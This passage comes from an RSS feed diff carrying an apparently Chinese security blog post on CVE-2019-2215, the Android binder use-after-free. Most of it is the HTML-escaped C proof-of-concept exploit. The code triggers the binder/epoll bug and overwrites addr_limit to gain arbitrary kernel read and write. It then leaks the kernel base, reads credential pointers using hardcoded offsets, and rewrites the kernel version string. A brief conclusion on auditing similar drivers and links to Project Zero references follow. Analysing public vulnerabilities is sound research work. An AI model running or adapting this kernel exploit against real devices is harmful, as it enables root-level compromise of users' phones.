+    printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;CHILD: Finished EPOLL_CTL_DEL.&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (write(socks[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;], second_write_chunk, &lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt;(second_write_chunk)) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt;(second_write_chunk))
+      err(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;write second chunk to socket&amp;#34;&lt;/span&gt;);
+    exit(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;);
+  }
+  ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;msghdr&lt;/span&gt; msg &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {
+    .msg_iov &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; iovec_array,
+    .msg_iovlen &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; IOVEC_ARRAY_SZ
+  };
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; recvmsg_result &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; recvmsg(socks[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;], &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;msg, MSG_WAITALL);
+  printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;recvmsg() returns %d, expected %lu&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, recvmsg_result,
+      (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt;)(iovec_array[IOVEC_INDX_FOR_WQ].iov_len &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;
+      iovec_array[IOVEC_INDX_FOR_WQ &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;].iov_len &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;
+      iovec_array[IOVEC_INDX_FOR_WQ &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;].iov_len));
+}
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; kernel_rw_pipe[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;];
+&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;kernel_write&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; kaddr, &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;buf, &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; len) {
+  errno &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (len &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1000&lt;/span&gt;) errx(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;kernel writes over PAGE_SIZE are messy, tried 0x%lx&amp;#34;&lt;/span&gt;, len);
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (write(kernel_rw_pipe[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;], buf, len) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; len) err(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;kernel_write failed to load userspace buffer&amp;#34;&lt;/span&gt;);
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (read(kernel_rw_pipe[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;], (&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)kaddr, len) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; len) err(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;kernel_write failed to overwrite kernel memory&amp;#34;&lt;/span&gt;);
+}
+&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;kernel_read&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; kaddr, &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;buf, &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; len) {
+  errno &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (len &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1000&lt;/span&gt;) errx(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;kernel writes over PAGE_SIZE are messy, tried 0x%lx&amp;#34;&lt;/span&gt;, len);
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (write(kernel_rw_pipe[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;], (&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)kaddr, len) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; len) err(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;kernel_read failed to read kernel memory&amp;#34;&lt;/span&gt;);
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (read(kernel_rw_pipe[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;], buf, len) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; len) err(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;kernel_read failed to write out to userspace&amp;#34;&lt;/span&gt;);
+}
+&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;kernel_read_ulong&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; kaddr) {
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; data;
+  kernel_read(kaddr, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;data, &lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt;(data));
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; data;
+}
+&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;kernel_write_ulong&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; kaddr, &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; data) {
+  kernel_write(kaddr, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;data, &lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt;(data));
+}
+&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;kernel_write_uint&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; kaddr, &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; data) {
+  kernel_write(kaddr, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;data, &lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt;(data));
+}
+
+&lt;span style=&#34;color:#75715e&#34;&gt;// Linux localhost 4.4.177-g83bee1dc48e8 #1 SMP PREEMPT Mon Jul 22 20:12:03 UTC 2019 aarch64
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// data from `pahole` on my own build with the same .config
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define OFFSET__task_struct__mm 0x520
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define OFFSET__task_struct__cred 0x790
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define OFFSET__mm_struct__user_ns 0x300
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define OFFSET__uts_namespace__name__version 0xc7
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// SYMBOL_* are relative to _head; data from /proc/kallsyms on userdebug
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define SYMBOL__init_user_ns 0x202f2c8
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define SYMBOL__init_task 0x20257d0
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define SYMBOL__init_uts_ns 0x20255c0
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt;) {
+  printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Starting POC&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
+  &lt;span style=&#34;color:#75715e&#34;&gt;//pin_to(0);
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+  dummy_page_4g_aligned &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; mmap((&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#ae81ff&#34;&gt;0x100000000UL&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x2000&lt;/span&gt;, PROT_READ&lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;PROT_WRITE, MAP_PRIVATE&lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;MAP_ANONYMOUS, &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;);
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (dummy_page_4g_aligned &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#ae81ff&#34;&gt;0x100000000UL&lt;/span&gt;)
+    err(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;mmap 4g aligned&amp;#34;&lt;/span&gt;);
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (pipe(kernel_rw_pipe)) err(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;kernel_rw_pipe&amp;#34;&lt;/span&gt;);
+
+  binder_fd &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/dev/binder&amp;#34;&lt;/span&gt;, O_RDONLY);
+  epfd &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; epoll_create(&lt;span style=&#34;color:#ae81ff&#34;&gt;1000&lt;/span&gt;);
+  leak_task_struct();
+  clobber_addr_limit();
+
+  setbuf(stdout, NULL);
+  printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;should have stable kernel R/W now&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
+
+  &lt;span style=&#34;color:#75715e&#34;&gt;/* in case you want to do stuff with the creds, to show that you can get them: */&lt;/span&gt;
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; current_mm &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; kernel_read_ulong(current_ptr &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; OFFSET__task_struct__mm);
+  printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;current-&amp;gt;mm == 0x%lx&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, current_mm);
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; current_user_ns &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; kernel_read_ulong(current_mm &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; OFFSET__mm_struct__user_ns);
+  printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;current-&amp;gt;mm-&amp;gt;user_ns == 0x%lx&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, current_user_ns);
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; kernel_base &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; current_user_ns &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; SYMBOL__init_user_ns;
+  printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;kernel base is 0x%lx&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, kernel_base);
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (kernel_base &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xfffUL&lt;/span&gt;) errx(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;bad kernel base (not 0x...000)&amp;#34;&lt;/span&gt;);
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; init_task &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; kernel_base &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; SYMBOL__init_task;
+  printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;amp;init_task == 0x%lx&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, init_task);
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; init_task_cred &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; kernel_read_ulong(init_task &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; OFFSET__task_struct__cred);
+  printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;init_task.cred == 0x%lx&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, init_task_cred);
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; my_cred &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; kernel_read_ulong(current_ptr &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; OFFSET__task_struct__cred);
+  printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;current-&amp;gt;cred == 0x%lx&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, my_cred);
+
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; init_uts_ns &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; kernel_base &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; SYMBOL__init_uts_ns;
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; new_uts_version[] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;EXPLOITED KERNEL&amp;#34;&lt;/span&gt;;
+  kernel_write(init_uts_ns &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; OFFSET__uts_namespace__name__version, new_uts_version, &lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt;(new_uts_version));
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;3-conclusion&#34;&gt;3. Conclusion&lt;/h2&gt;
+&lt;p&gt;CVE-2019-2215的问题在于binder这类提供通过设备文件访问其功能的内核驱动没有处理好其销毁过程中和epoll联动部分(同步销毁其在epoll中可能存在的引用)。针对此类问题，可以尝试扩展到其他类似的驱动模块上进行代码审计，审计点在于check是否同样存在没有同步销毁其于epoll中的引用的问题。&lt;/p&gt;
+&lt;h2 id=&#34;4-reference&#34;&gt;4. Reference&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://googleprojectzero.blogspot.com/2019/11/bad-binder-android-in-wild-exploit.html&#34;&gt;https://googleprojectzero.blogspot.com/2019/11/bad-binder-android-in-wild-exploit.html&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://bugs.chromium.org/p/project-zero/issues/detail?id=1942&#34;&gt;https://bugs.chromium.org/p/project-zero/issues/detail?id=1942&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://bugs.chromium.org/p/project-zero/issues/attachmentText?aid=414885&#34;&gt;https://bugs.chromium.org/p/project-zero/issues/attachmentText?aid=414885&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://dayzerosec.com/posts/analyzing-androids-cve-2019-2215-dev-binder-uaf/&#34;&gt;https://dayzerosec.com/posts/analyzing-androids-cve-2019-2215-dev-binder-uaf/&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+    </item>
     
     <item>
       <title>Build SQLITE For Android</title>
